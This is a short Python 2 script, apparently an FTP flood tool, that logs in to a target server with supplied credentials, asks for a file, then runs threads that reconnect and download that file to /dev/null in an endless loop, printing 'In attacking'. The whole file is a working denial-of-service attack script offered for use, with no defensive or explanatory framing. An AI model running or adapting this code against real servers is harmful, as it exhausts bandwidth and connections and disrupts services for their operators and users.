#-*- encoding: utf-8 -*-
#author:bulel
#use   : python ftplogincc.py ip username password

from ftplib import FTP

import sys
import threading
import time

ftp_IP = sys.argv[1]
uname  = sys.argv[2]
pwd    = sys.argv[3]

print "FTP server IP:", ftp_IP
print "In attacking"


class attack(threading.Thread):

    def run(*args):

        while 1:
            try:
                ftp=FTP()
                ftp.connect(ftp_IP)
                ftp.login(user=uname,passwd=pwd)
                ftp.retrbinary('RETR %s'%remote_file,local_file.write,size)
                #print "."
            except:
                time.sleep(3)
                pass


def main():
    threads=[attack() for i in range(2)]
    for a in threads:
        a.start()

if __name__=="__main__":

    ftp=FTP()
    ftp.connect(ftp_IP)
    ftp.login(user=uname,passwd=pwd)
    ftp.retrlines('LIST')
    
    local_file=open('/dev/null','wb')
    remote_file=raw_input('Please input file to be get: \r\n')
    print "-"*40

    size=int(ftp.size(remote_file))
    print "The size of file to be get: ",size

    ftp.quit()
    ftp.close()

    main()
